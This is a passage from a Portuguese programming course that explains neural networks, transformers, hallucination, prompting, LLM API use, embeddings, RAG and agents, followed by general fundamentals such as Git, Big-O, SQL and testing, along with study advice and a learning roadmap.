A reta da aula anterior só resolve problema que é uma reta. O mundo não é. A rede neural resolve isso empilhando muitas funções simples.

Um **neurônio** faz três coisas:

```
entradas          pesos
  x1 ──── w1 ──┐
  x2 ──── w2 ──┼──►  soma = x1·w1 + x2·w2 + x3·w3 + viés
  x3 ──── w3 ──┘              │
                              ▼
                        ativação(soma)  ──►  saída
```

1. **Multiplica** cada entrada pelo seu peso
2. **Soma** tudo, mais um valor extra chamado *viés*
3. **Passa por uma ativação** — uma função que dobra a reta

O passo 3 é o que importa e quase nunca é explicado. A ativação mais comum é ridiculamente simples:

```python
def relu(x):
    return max(0, x)      # negativo vira zero, positivo passa igual
```

Sem essa dobra, empilhar camadas seria inútil: soma de retas dá reta, e mil camadas lineares equivalem a uma só. **É a ativação que permite à rede aprender curvas** — e portanto qualquer coisa.

Empilhando neurônios em **camadas**:

```
 entrada        camada oculta         saída
   ○ ──────────►  ○  ○  ○  ○  ──────────► ○
   ○ ──────────►  ○  ○  ○  ○  ──────────► ○
   ○ ──────────►  ○  ○  ○  ○
        (todos ligados a todos)
```

Cada seta é um peso. Uma rede pequena tem milhares; um LLM tem centenas de bilhões. **Esses pesos são o modelo.** Quando alguém diz "baixei um modelo de 7 bilhões de parâmetros", baixou um arquivo com 7 bilhões de números.

### Aula 12.4 — Treino, e o que dá errado nele

O treino segue o laço da Aula 12.2, agora com um passo a mais para distribuir a culpa entre as camadas:

1. **Passagem para frente** — os dados entram e viram uma previsão
2. **Cálculo da perda** — o quanto essa previsão errou
3. **Retropropagação** — o erro volta camada por camada, calculando quanto **cada peso** contribuiu
4. **Atualização** — cada peso anda um passo na direção que reduz o erro

Uma volta completa sobre todos os dados é uma **época**. Treina-se por muitas épocas.

**O problema que define o ofício: sobreajuste** (*overfitting*).

| Situação | Erro no treino | Erro em dado novo | Nome |
|----------|----------------|-------------------|------|
| Modelo simples demais | Alto | Alto | Subajuste |
| **Ponto certo** | Baixo | Baixo | — |
| Modelo decorou os dados | **Quase zero** | Alto | **Sobreajuste** |

Sobreajuste é o modelo **decorar em vez de generalizar**. É o aluno que decora a prova do ano passado: tira dez naquela, zero na nova.

E aqui está a parte contraintuitiva: **acerto perfeito no treino é um sinal ruim**, não bom. Por isso os dados sempre se dividem:

```python
from sklearn.model_selection import train_test_split

X_treino, X_teste, y_treino, y_teste = train_test_split(X, y, test_size=0.2)
# treina com 80%, avalia com os 20% que o modelo NUNCA viu
```

**A regra sagrada:** nunca avalie no que treinou. Se você ajustar o modelo olhando o resultado no teste, o teste deixa de ser teste — você acabou de contaminá-lo. É o mesmo raciocínio de escrever teste automatizado antes de ver a resposta.

---

## Nível Intermediário

### Aula 12.5 — O transformer e a atenção

Até 2017, processar texto era sequencial: a rede lia palavra por palavra e carregava um resumo do que veio antes. Frase longa fazia o começo se dissolver antes do fim.

O **transformer** trocou isso por uma ideia: em vez de carregar um resumo, deixe **cada palavra olhar diretamente para todas as outras** e decidir quais importam. Isso é a **atenção**.

Veja por que é necessário:

```
"O cachorro não atravessou a rua porque ele estava cansado."
"O cachorro não atravessou a rua porque ela estava movimentada."
```

Nas duas frases, a que se refere o pronome? Na primeira, `ele` → cachorro. Na segunda, `ela` → rua. **Uma única palavra trocada muda o alvo do pronome** — e não há regra de gramática que resolva isso, é preciso entender o sentido.

A atenção resolve assim: ao processar `ele`, o modelo calcula uma nota de relevância para cada outra palavra da frase. `cachorro` recebe nota alta, `rua` baixa. Na segunda frase, com `movimentada`, os pesos se invertem. Essas notas não são programadas — foram aprendidas de bilhões de frases onde esse padrão aparece.

Três consequências de peso:

- **Paralelismo.** Todas as palavras são processadas ao mesmo tempo, não em fila. Foi isso que tornou viável treinar em volume gigantesco — e é a razão de a IA ter explodido a partir de 2017, e não antes.
- **Distância deixa de importar.** A primeira e a última palavra de um texto longo se enxergam diretamente.
- **Custo cresce ao quadrado.** Cada palavra olha para todas as outras: dobrar o texto quadruplica a conta. É por isso que contexto longo é caro, e por que existe limite.

**O que o LLM realmente faz.** Depois de todo esse aparato, a tarefa do modelo é modesta: **prever o próximo token**. Só isso. Ele recebe o texto até aqui e devolve uma distribuição de probabilidade sobre o que vem a seguir. Escolhe um, acrescenta ao texto, e repete.

Toda a aparência de raciocínio emerge daí. Não há plano, banco de fatos nem intenção — há previsão de continuação, feita por um modelo que viu texto suficiente para que "a continuação provável" quase sempre seja também "a continuação correta". **Quase.**

### Aula 12.6 — Tokens, contexto e temperatura

**Token** é a unidade que o modelo enxerga. Não é palavra nem letra — é um pedaço, tipicamente de alguns caracteres.

```
"programação"        →  ["program", "ação"]            2 tokens
"O gato dormiu."     →  ["O", " gato", " dormiu", "."] 4 tokens
```

*(A divisão exata depende do tokenizador de cada modelo — os exemplos acima ilustram o formato, não são a resposta de um modelo específico. Todo provedor oferece um contador de tokens; use-o quando o número importar.)*

Duas consequências práticas que confundem muita gente:

- **Você paga por token**, não por palavra. E **português custa mais que inglês**: os tokenizadores são treinados majoritariamente em texto inglês, então palavra em português costuma quebrar em mais pedaços. Uma palavra que em inglês é um token pode virar dois ou três aqui. Se você orçou pela contagem em inglês, a conta vem maior.
- **O modelo não vê letras.** Por isso ele erra ao contar quantos "r" há em "morrer" ou ao inverter uma palavra: essas tarefas exigem enxergar caracteres, e ele enxerga blocos. Não é burrice — é o formato da entrada.

**Janela de contexto** é quanto ele consegue ler de uma vez, medida em tokens. Passou do limite, o começo é cortado. É por isso que uma conversa longa parece "esquecer" o que foi dito lá atrás: não foi esquecimento, foi truncamento.

**Temperatura** controla o quanto ele arrisca na escolha do próximo token:

| Temperatura | Comportamento | Use para |
|-------------|---------------|----------|
| 0 | Sempre o mais provável; determinístico | Extração, classificação, código |
| 0,7 | Equilíbrio | Conversa, texto geral |
| 1,5 | Escolhe opções improváveis | Brainstorm, criação |

**Para tarefa com resposta certa, use 0.** Temperatura alta em extração de dados é como jogar dado para decidir o CPF do cliente.

### Aula 12.7 — Por que alucina

**Alucinação** é o modelo afirmar com convicção algo falso. Inventa função que não existe, cita lei errada, cria referência bibliográfica plausível e inexistente.

Depois das aulas anteriores, a causa deveria estar clara: **o modelo prevê a continuação mais provável, e não existe nenhuma etapa que verifique se ela é verdadeira.**

Repare no que isso implica. Se você pergunta o nome de um método que soa como se devesse existir, a continuação estatisticamente provável é um nome plausível — e o modelo produz esse nome com exatamente a mesma confiança de quando está certo. **Ele não sabe que não sabe.** Não há sinal interno de "isto é chute".

Isso não é defeito a ser corrigido numa versão futura. É consequência direta de como a coisa funciona. Melhora com escala e com técnica, mas não desaparece.

**Onde o risco é maior:**

| Situação | Risco |
|----------|-------|
| Fato específico, data, número, citação | **Alto** |
| Conteúdo posterior ao treino | **Alto** — ele não sabe o que não viu |
| API ou biblioteca pouco conhecida | **Alto** — inventa método plausível |
| Explicar conceito comum | Baixo |
| Reescrever texto que você forneceu | Baixo |

**A regra que resume o módulo inteiro:** quanto mais específica e verificável a afirmação, mais você precisa verificar. Quanto mais o modelo está transformando algo que **você** deu, mais pode confiar.

É por isso que a Aula 12.12 (RAG) existe: dar o material ao modelo em vez de pedir que ele lembre reduz a alucinação drasticamente, porque troca "lembre" por "leia".

### Aula 12.8 — Usar IA para programar sem virar dependente

Este é o assunto mais importante do módulo para a sua carreira, e o mais mal resolvido no mercado.

A IA te deixa mais rápido. Também te deixa **mais raso**, se você usar errado. E o mercado percebe a diferença numa entrevista técnica em dez minutos.

**A distinção que decide tudo:**

| Uso que fortalece | Uso que atrofia |
|-------------------|-----------------|
| "Explique por que este código dá erro" | "Conserta aí" (e você cola sem ler) |
| "Que abordagens existem para isto?" | "Escreve o projeto inteiro" |
| "Revise meu código e aponte problemas" | "Faz o exercício por mim" |
| "Como isso funciona por baixo?" | "Me dá a resposta" |
| Escrever o teste você e pedir a implementação | Aceitar código sem teste nenhum |

**Enquanto você estiver nos Módulos 0 a 7, seja rigoroso.** Aquela regra do começo do material — digite todo código à mão, trave 20 minutos antes de procurar a resposta — vale ainda mais agora, porque nunca foi tão fácil pular o travamento. E o travamento é onde o aprendizado acontece. IA que resolve seu exercício rouba exatamente a parte que ensina.

**A regra inegociável, para sempre:** *nunca entregue código que você não sabe explicar linha por linha.* Se não sabe, ou você lê até saber, ou apaga. Esta é a mesma regra que o material já dava sobre copiar e colar da internet — a IA só a tornou mais urgente.

**Como usar bem, na prática:**

1. Escreva você primeiro, mesmo feio
2. Peça revisão — é aqui que ela é mais valiosa
3. Peça a explicação do que ela sugeriu, não só a sugestão
4. Desconfie de API que você nunca viu: **confira na documentação** (Aula 12.7)
5. Rode os testes. IA escreve código que parece certo com uma facilidade assustadora

### Aula 12.9 — Prompt: o que funciona e o que é folclore

Muito do que circula como "engenharia de prompt" é superstição. Isto é o que tem efeito real:

**1. Contexto e papel específicos**

```
Ruim:  Escreva sobre banco de dados.

Bom:   Você está explicando para alguém que já programa em Python
       mas nunca usou SQL. Explique o que é um índice, com um exemplo
       de consulta lenta antes e depois. Máximo 300 palavras.
```

**2. Dê exemplos** (chamado *few-shot*). É a técnica de maior retorno:

```
Classifique o sentimento como POSITIVO, NEGATIVO ou NEUTRO.

Texto: "Entrega atrasou mas o produto é ótimo"  →  NEUTRO
Texto: "Melhor compra do ano"                   →  POSITIVO
Texto: "Chegou quebrado e ninguém responde"     →  NEGATIVO

Texto: "Funciona, mas esperava mais pelo preço" →
```

Os três exemplos ensinam mais sobre o seu critério do que qualquer parágrafo de instrução — inclusive que "atrasou mas é ótimo" conta como neutro, e não negativo.

**3. Peça o formato de saída, explicitamente**

```
Responda em JSON, sem texto antes ou depois:
{"sentimento": "...", "confianca": 0.0}
```

**4. Deixe pensar antes de responder.** Para problema com raciocínio, pedir os passos antes da conclusão melhora o resultado de forma mensurável. Faz sentido dado o mecanismo: cada token gerado entra no contexto do próximo, então escrever o raciocínio literalmente dá ao modelo mais material para acertar o final.

**5. Diga o que fazer, não o que evitar.** "Responda em no máximo três frases" funciona melhor que "não seja prolixo".

**O que é folclore:** oferecer gorjeta, ameaçar, dizer que é urgente, mandar "respire fundo", afirmar que a resposta é vital. Nada disso tem efeito confiável. Se funcionou uma vez, foi variação aleatória.

**O teste honesto de um prompt:** rode dez entradas diferentes e conte os acertos. Uma boa impressão em um caso não é medição — é a mesma armadilha do sobreajuste da Aula 12.4.

---

## Nível Avançado

### Aula 12.10 — Chamando a API

Sair do chat e colocar IA dentro do seu software.

```python
from anthropic import Anthropic

client = Anthropic()      # lê a chave da variável ANTHROPIC_API_KEY

resposta = client.messages.create(
    model="claude-opus-5",
    max_tokens=1024,
    messages=[
        {"role": "user", "content": "Explique recursão em duas frases."}
    ],
)

print(resposta.content[0].text)
```

**Nunca escreva a chave no código.** Ela vai para o Git, o Git vai para o GitHub, e robôs varrem o GitHub procurando chave vazada — em minutos, não dias. Use variável de ambiente, exatamente como o Módulo 10 ensinou.

**A conversa é sem memória.** Isto surpreende todo mundo na primeira vez: a API não guarda nada entre chamadas. Para haver conversa, **você** reenvia o histórico inteiro a cada vez:

```python
historico = [
    {"role": "user",      "content": "Meu nome é Lucas."},
    {"role": "assistant", "content": "Olá, Lucas! Como posso ajudar?"},
    {"role": "user",      "content": "Qual é o meu nome?"},   # só funciona
]                                                              # por causa das
                                                               # duas linhas acima
resposta = client.messages.create(
    model="claude-opus-5",
    max_tokens=1024,
    system="Você é um tutor de programação. Seja direto.",
    messages=historico,
)
```

Duas consequências disso, e as duas custam dinheiro:

- **Conversa longa fica cara**, porque você paga o histórico inteiro de novo a cada mensagem
- **Conversa longa estoura a janela** de contexto (Aula 12.6), e aí é preciso resumir ou descartar o começo

O `system` é a instrução permanente — papel, regras, formato. Diferente das mensagens, ele não é parte do diálogo.

### Aula 12.11 — Embeddings e busca semântica

Um **embedding** transforma texto num vetor de números que representa o **significado**. Textos de sentido parecido ficam próximos nesse espaço, mesmo sem nenhuma palavra em comum.

```
"cachorro"    →  [0.21, -0.44, 0.87, ...]   ┐ próximos
"cão"         →  [0.23, -0.41, 0.85, ...]   ┘
"automóvel"   →  [-0.62, 0.11, -0.30, ...]  ← distante dos dois
```

Isso resolve um problema que a busca por palavra não resolve: quem procura "como cancelar assinatura" deveria achar o texto "encerrar plano recorrente", e a busca literal não acha — não há uma palavra em comum.

```python
from sentence_transformers import SentenceTransformer
from sklearn.metrics.pairwise import cosine_similarity

modelo = SentenceTransformer("paraphrase-multilingual-MiniLM-L12-v2")

documentos = [
    "Encerre seu plano recorrente em Configurações > Plano.",
    "O prazo de entrega padrão é de 5 dias úteis.",
    "Aceitamos cartão, boleto e Pix.",
]

pergunta = "como faço para cancelar minha assinatura?"

vet_docs = modelo.encode(documentos)
vet_perg = modelo.encode([pergunta])

notas = cosine_similarity(vet_perg, vet_docs)[0]
melhor = notas.argmax()

print(f"{notas[melhor]:.2f} — {documentos[melhor]}")
# → o primeiro documento vence, com folga sobre os outros dois
```

Repare nas palavras: a pergunta fala em "cancelar assinatura"; o documento, em "encerrar plano recorrente". **Nenhuma palavra aparece nos dois** — confira uma a uma — e mesmo assim ele foi encontrado. Isso é busca semântica, e é a peça que falta para a próxima aula.

*(Não cito a nota exata de propósito: ela muda conforme o modelo de embedding. O que importa, e é estável, é qual documento vence.)*

A **similaridade do cosseno** mede o ângulo entre dois vetores: 1 é mesma direção, 0 é sem relação. Não é o único jeito de medir, mas é o padrão.

### Aula 12.12 — RAG: dar seus dados ao modelo

O modelo não conhece os documentos da sua empresa, e perguntar sobre eles produz alucinação (Aula 12.7). **RAG** (*Retrieval-Augmented Generation*) resolve trocando "lembre" por "leia":

```
Pergunta do usuário
        │
        ▼
1. BUSCAR ────────► acha os trechos relevantes na sua base (Aula 12.11)
        │
        ▼
2. MONTAR ────────► cola esses trechos no prompt, como contexto
        │
        ▼
3. GERAR ─────────► o modelo responde usando SÓ o que recebeu
```

```python
def responder(pergunta, documentos, modelo_emb, client):
    # 1. buscar os 3 trechos mais próximos
    vet_docs = modelo_emb.encode(documentos)
    vet_perg = modelo_emb.encode([pergunta])
    notas = cosine_similarity(vet_perg, vet_docs)[0]
    melhores = notas.argsort()[-3:][::-1]
    contexto = "\n\n".join(documentos[i] for i in melhores)

    # 2. montar o prompt com o contexto
    prompt = f"""Responda à pergunta usando APENAS o contexto abaixo.
Se a resposta não estiver no contexto, diga "não encontrei essa informação".

Contexto:
{contexto}

Pergunta: {pergunta}"""

    # 3. gerar
    resposta = client.messages.create(
        model="claude-opus-5",
        max_tokens=1024,
        messages=[{"role": "user", "content": prompt}],
    )
    return resposta.content[0].text
```

A linha que faz o RAG valer a pena é esta: **"se a resposta não estiver no contexto, diga que não encontrou"**. Sem ela o modelo completa a lacuna com invenção, que é o comportamento padrão dele. Com ela, você ganha um sistema que admite não saber — coisa rara e valiosa.

**Onde o RAG falha na vida real**, e vale saber antes de prometer para um cliente:

| Problema | Por quê |
|----------|---------|
| A busca não acha o trecho certo | Se o passo 1 erra, o passo 3 não tem salvação |
| Trecho cortado no meio | A resposta estava dividida entre dois pedaços |
| Pergunta que exige juntar 10 documentos | Só cabem 3 no contexto |
| Base desatualizada | Ele responde certo, com dado velho |

RAG não é mágica: é busca seguida de leitura. **Se a busca for ruim, a resposta será ruim** — e a maior parte do trabalho num projeto de RAG está em fazer o passo 1 direito, não no modelo.

### Aula 12.13 — Agentes e ferramentas

Um LLM sozinho só produz texto. Não sabe a hora, não consulta seu banco, não envia email. **Ferramentas** (*tool use*) resolvem isso: você descreve funções disponíveis, e o modelo pede para chamá-las.

```python
ferramentas = [{
    "name": "consultar_pedido",
    "description": "Busca a situação de um pedido pelo número.",
    "input_schema": {
        "type": "object",
        "properties": {
            "numero": {"type": "string", "description": "Número do pedido"}
        },
        "required": ["numero"],
    },
}]

resposta = client.messages.create(
    model="claude-opus-5",
    max_tokens=1024,
    tools=ferramentas,
    messages=[{"role": "user", "content": "Cadê meu pedido 12345?"}],
)
```

O ponto essencial, que quase todo mundo entende errado no começo: **o modelo não executa nada**. Ele devolve *"quero chamar `consultar_pedido` com `numero=12345`"*. Quem roda a função é o **seu código**. Você executa, devolve o resultado, e ele formula a resposta final.

Isso é ótimo para segurança: nada acontece sem passar pelo seu código, e é lá que você valida.

Um **agente** é esse ciclo em laço, até a tarefa acabar:

```
recebe objetivo → decide ferramenta → você executa → recebe resultado
        ▲                                                    │
        └────────────────────────────────────────────────────┘
                    até concluir ou desistir
```

**Quando agente vale a pena — e quando não:**

| Vale | Não vale |
|------|----------|
| Tarefa de vários passos, difícil de especificar antes | Tarefa fixa e conhecida |
| O caminho depende do que for descobrindo | Você já sabe a sequência |
| Erro é detectável e reversível | Erro custa caro e não tem volta |

Se você **já sabe** a sequência de passos, escreva um programa comum. Ele é mais barato, mais rápido e mais previsível que um agente. Agente é para quando o caminho não é conhecido de antemão — e tudo que ele puder fazer, cerque com validação e com limite de custo.

### Aula 12.14 — Custo, privacidade, viés e o que não delegar

**Custo.** Você paga por token, entrada e saída, e a saída costuma custar bem mais. Três hábitos que reduzem a conta sem piorar o resultado:

- Não reenvie histórico que não é mais necessário
- Peça saída curta quando saída curta resolve
- Use modelo menor no que é simples — classificar não precisa do modelo mais caro

Meça antes de otimizar. A resposta quase sempre está em reenviar contexto demais, não no preço do modelo.

**Privacidade — a parte que dá processo.** Ao mandar dados para uma API, você está mandando dados para fora da sua empresa. Isso tem consequência legal, e no Brasil ela se chama LGPD.

Nunca envie sem base legal e sem anonimizar: CPF, dado de saúde, dado bancário, conversa privada de cliente, segredo industrial. **"O modelo não guarda"** não é garantia suficiente — a responsabilidade pelo dado continua sendo da sua empresa. Quando o dado é sensível, a alternativa é modelo rodando na sua própria infraestrutura.

**Viés.** O modelo aprendeu de texto humano, e absorveu os padrões que estão lá — inclusive os ruins. Um modelo treinado em currículos históricos de uma área majoritariamente masculina aprende a associar aquela área a homens, e reproduz isso numa triagem. Ninguém programou o preconceito: ele estava nos dados, e o modelo é uma máquina de captar padrão nos dados.

Consequência prática: **em decisão que afeta a vida de alguém** — contratação, crédito, benefício, diagnóstico — a IA sugere, humano decide, e a decisão precisa ser auditável.

**O que não delegar.** Uma lista curta, que vale para qualquer projeto seu:

- Decisão irreversível sem revisão humana
- Diagnóstico médico, parecer jurídico e conselho financeiro sem profissional responsável
- Código que vai para produção sem alguém que saiba explicá-lo
- Qualquer coisa em que "o sistema errou" não seja resposta aceitável para o prejudicado

**Como isso muda a sua profissão.** A IA não vai eliminar programadores — está eliminando a parte **mecânica** de programar. O que valoriza: entender o problema do negócio, decidir arquitetura, revisar criticamente, saber o que **não** automatizar, e depurar o que ninguém entende.

Repare que essa lista é exatamente o que o material inteiro vem construindo desde o Módulo 0. Quem só sabia produzir sintaxe está em risco real. Quem sabe **pensar** o problema ganhou uma ferramenta poderosa — e essa diferença é a razão de a lógica ter vindo antes de qualquer linguagem.

---

## Projetos do Módulo 12

**Projeto 1 — Classificador do zero, sem biblioteca de IA**
Implemente uma regressão logística à mão, em NumPy, para classificar algo real (spam, sentimento, aprovação). Escreva você o gradiente descendente. Separe treino e teste, e mostre as duas acurácias. Se a do treino for muito maior que a do teste, explique por quê. Este projeto derruba o mito de que IA é caixa-preta inacessível.

**Projeto 2 — Assistente com RAG sobre dados seus**
Escolha uma base real que você tenha — documentação de um projeto, apostilas, regulamento do condomínio. Faça a divisão em trechos, gere embeddings, monte a busca e o prompt com contexto. **Obrigatório:** ele precisa responder "não encontrei" quando a resposta não estiver na base. Teste com dez perguntas, sendo três que não têm resposta ali, e mostre que ele não inventou nenhuma.

**Projeto 3 — Agente com ferramentas**
Um agente que resolve algo real com pelo menos três ferramentas suas: consultar seu banco do Módulo 9, chamar uma API pública, gerar um arquivo. Trate o caso do modelo pedir ferramenta inexistente ou argumento inválido, e coloque um teto de iterações para ele não rodar em laço infinito gastando dinheiro.

---

## Checklist de saída do Módulo 12

- [ ] Explico a diferença entre programação comum e aprendizado de máquina
- [ ] Escrevo um gradiente descendente do zero e explico cada linha
- [ ] Explico por que a ativação é indispensável numa rede neural
- [ ] Sei o que é sobreajuste e por que acerto perfeito no treino é sinal ruim
- [ ] Explico o que a atenção resolve, com um exemplo de ambiguidade
- [ ] Sei por que o modelo alucina, e em que situações desconfiar mais
- [ ] Uso IA para aprender mais rápido, não para pular o aprendizado
- [ ] Chamo a API mantendo histórico e sem expor a chave
- [ ] Construí um RAG que admite não saber a resposta
- [ ] Sei quando um agente vale a pena e quando um programa comum resolve
- [ ] Sei o que nunca enviar para uma API de terceiros

---

# MÓDULO 13 — O que atravessa todas as linguagens

> Estude em paralelo aos módulos, não depois. Marquei em qual módulo faz sentido começar cada um.

Linguagem é vocabulário. O que segue é gramática — e é o que decide se você é programador ou digitador de sintaxe.

## 13.1 — Git e GitHub *(comece junto com o Módulo 1)*

Não é opcional. Toda vaga exige, e é o seu portfólio.

```bash
git init
git add .
git commit -m "Descrição do que mudou"
git remote add origin https://github.com/usuario/repo.git
git push -u origin main

git branch minha-feature
git checkout minha-feature
git merge minha-feature
git log --oneline
git status
```

Comece a usar no seu primeiro projeto de HTML. Um GitHub com commits regulares há dois anos vale mais numa entrevista que um certificado.

## 13.2 — Estruturas de dados *(comece no Módulo 4, aprofunde no 6)*

| Estrutura | Para que serve | Custo de busca |
|-----------|----------------|----------------|
| Array | Acesso por posição | O(1) por índice, O(n) por valor |
| Lista ligada | Inserção/remoção frequente | O(n) |
| Pilha (LIFO) | Desfazer, chamadas de função | O(n) |
| Fila (FIFO) | Processamento em ordem | O(n) |
| Tabela hash | Busca por chave | O(1) em média |
| Árvore binária de busca | Dados ordenados | O(log n) |
| Grafo | Relações, rotas, redes | Depende |

## 13.3 — Algoritmos e complexidade *(Módulo 4 em diante)*

**Notação Big-O** descreve como o tempo cresce conforme os dados crescem:

| Notação | Nome | Exemplo | 1.000 itens |
|---------|------|---------|-------------|
| O(1) | Constante | Acessar `v[5]` | 1 operação |
| O(log n) | Logarítmica | Busca binária | ~10 |
| O(n) | Linear | Percorrer uma lista | 1.000 |
| O(n log n) | Linearítmica | Merge sort, quick sort | ~10.000 |
| O(n²) | Quadrática | Dois laços aninhados | 1.000.000 |
| O(2ⁿ) | Exponencial | Força bruta | inviável |

A lição prática: **dois laços aninhados sobre o mesmo dado é sinal de alerta**. Com 100 itens é instantâneo, com 100 mil o programa morre.

Algoritmos para implementar você mesmo pelo menos uma vez: busca linear, busca binária, bubble sort, insertion sort, merge sort, quick sort, recursão (fatorial, Fibonacci, Torre de Hanói).

## 13.4 — Banco de dados *(Módulo 4 em diante)*

```sql
SELECT nome, preco FROM produtos WHERE preco > 100 ORDER BY preco DESC;
INSERT INTO produtos (nome, preco) VALUES ('Café', 18.00);
UPDATE produtos SET preco = 20.00 WHERE id = 1;
DELETE FROM produtos WHERE id = 1;

SELECT p.nome, c.nome AS categoria
FROM produtos p
JOIN categorias c ON p.categoria_id = c.id;
```

Aprenda SQL antes de qualquer ORM. Comece com SQLite (não exige instalar servidor), depois PostgreSQL.

## 13.5 — Como a web funciona *(Módulo 3 em diante)*

- Cliente e servidor; o que roda em cada um
- HTTP: métodos GET, POST, PUT, DELETE
- Códigos de status: 200, 201, 301, 400, 401, 403, 404, 500
- JSON como formato de troca
- API REST: recursos e endpoints
- Autenticação: sessão, token, JWT
- DNS e como o navegador acha o servidor

## 13.6 — Boas práticas *(sempre)*

- **DRY** (*Don't Repeat Yourself*): copiou e colou código? Vira função.
- **KISS** (*Keep It Simple*): a solução esperta que ninguém entende é pior que a óbvia.
- **YAGNI** (*You Aren't Gonna Need It*): não construa para um futuro imaginário.
- **Nomes claros**: `calcularImpostoRenda()` vale mais que qualquer comentário.
- **Comente o porquê, não o quê**: o código já diz o que faz. Escreva por que faz assim.
- **Commits pequenos e frequentes**, com mensagem que descreve a mudança.

## 13.7 — Testes *(Módulo 4 em diante)*

```python
# Python: pytest
def test_calcular_media():
    assert calcular_media([8, 6]) == 7
    assert calcular_media([]) == 0
```

```javascript
// JavaScript: Jest
test('soma dois números', () => {
    expect(somar(2, 3)).toBe(5);
});
```

Teste automatizado é o que separa código de estimação de código profissional. Nenhuma empresa séria aceita código sem teste.

## 13.8 — Terminal e ambiente *(Módulo 1 em diante)*

```bash
cd pasta          ls -la          pwd
mkdir nova        rm -rf pasta    cp origem destino
cat arquivo       grep "texto" arquivo
```

E, em algum momento depois do Módulo 4: noções de Linux, Docker e integração contínua.

---

# Erros que quase todo iniciante comete

**Pular a lógica.** É a causa raiz de 90% das dificuldades depois. Se você está travando em JavaScript, o problema quase nunca é JavaScript — é lógica.

**Só assistir aula.** Assistir dá a sensação de aprender sem o aprendizado. Se você não fechou o vídeo e escreveu sozinho, não aprendeu.

**Pular para framework cedo demais.** React sem JavaScript sólido produz alguém que copia soluções sem entender e trava na primeira coisa fora do tutorial. Isso aparece na entrevista técnica em cinco minutos.

**Estudar quatro linguagens ao mesmo tempo.** Uma de cada vez, com profundidade. Trocar de linguagem quando aperta é fuga disfarçada de estratégia.

**Não terminar projetos.** Dez projetos com 40% feitos valem zero. Um projeto terminado e publicado vale uma entrevista.

**Achar que precisa saber tudo antes de se candidatar.** Ninguém sabe tudo. Vaga júnior não espera que você saiba — espera que você aprenda rápido e não trave sozinho.

**Copiar e colar sem entender.** Funciona hoje, te derruba na próxima. Se você colou algo, leia linha por linha até saber o que cada uma faz, ou apague.

**Comparar seu começo com o meio dos outros.** Todo mundo que você admira já esteve travado numa chave que não fechava.

---

# Recursos que valem o tempo

**Documentação (leia sempre a fonte primária):**
- [MDN Web Docs](https://developer.mozilla.org/pt-BR/) — HTML, CSS, JavaScript. A melhor referência que existe
- [Documentação oficial do Python](https://docs.python.org/pt-br/3/)
- [cppreference.com](https://en.cppreference.com/) — C e C++

**Prática:**
- [Beecrowd](https://www.beecrowd.com.br/) — exercícios em português, ótimo para lógica
- [Exercism](https://exercism.org/) — exercícios com correção por mentor humano, gratuito
- [Frontend Mentor](https://www.frontendmentor.io/) — layouts reais para implementar
- [Codewars](https://www.codewars.com/) — desafios por nível

**Cursos gratuitos e sérios:**
- [freeCodeCamp](https://www.freecodecamp.org/portuguese/) — currículo completo, em português
- [CS50 (Harvard)](https://cs50.harvard.edu/x/) — usa C, gratuito, é o melhor curso introdutório de ciência da computação que existe
- [The Odin Project](https://www.theodinproject.com/) — trilha web completa

**Livros:**
- *Entendendo Algoritmos* — Aditya Bhargava (ilustrado, ótimo primeiro livro)
- *Código Limpo* — Robert C. Martin (leia depois do Módulo 4)
- *The C Programming Language* — Kernighan & Ritchie (o clássico de C)

---

# Resumo do caminho

```
MÓDULO 0 — Lógica          3-4 sem    ●○○○○   a base de tudo
MÓDULO 1 — HTML            3 sem      ●○○○○   estrutura
MÓDULO 2 — CSS             5-6 sem    ●●○○○   apresentação
MÓDULO 3 — JavaScript      12-16 sem  ●●●○○   ← ponto de empregabilidade
MÓDULO 4 — Python          10-12 sem  ●●●○○   back-end e algoritmos
MÓDULO 5 — Java            10-12 sem  ●●●○○   ← back-end corporativo
MÓDULO 6 — C               10-12 sem  ●●●●○   como a máquina funciona
MÓDULO 7 — C++             12-16 sem  ●●●●●   abstração sem perder controle
MÓDULO 8 — Git             3-4 sem    ●●○○○   comece junto com o Módulo 1
MÓDULO 9 — SQL             8-10 sem   ●●●○○   onde os dados moram
MÓDULO 10 — Segurança      5-6 sem    ●●●○○   não vazar dado de usuário
MÓDULO 11 — Deploy         6-8 sem    ●●●○○   colocar no ar de verdade
MÓDULO 12 — IA             8-10 sem   ●●●○○   por dentro e na prática
MÓDULO 13 — Fundamentos    paralelo   —       o que realmente importa
```

Três coisas para levar daqui:

1. **Consistência bate intensidade.** Uma hora por dia, cinco dias por semana, derruba oito horas de sábado.
2. **Projeto terminado é a única prova.** Ninguém contrata por horas assistidas.
3. **Travar é o processo, não uma falha nele.** Quem programa há dez anos ainda passa uma tarde inteira num bug bobo. A diferença é que já sabe que isso passa.

Comece hoje pelo Módulo 0. No papel.
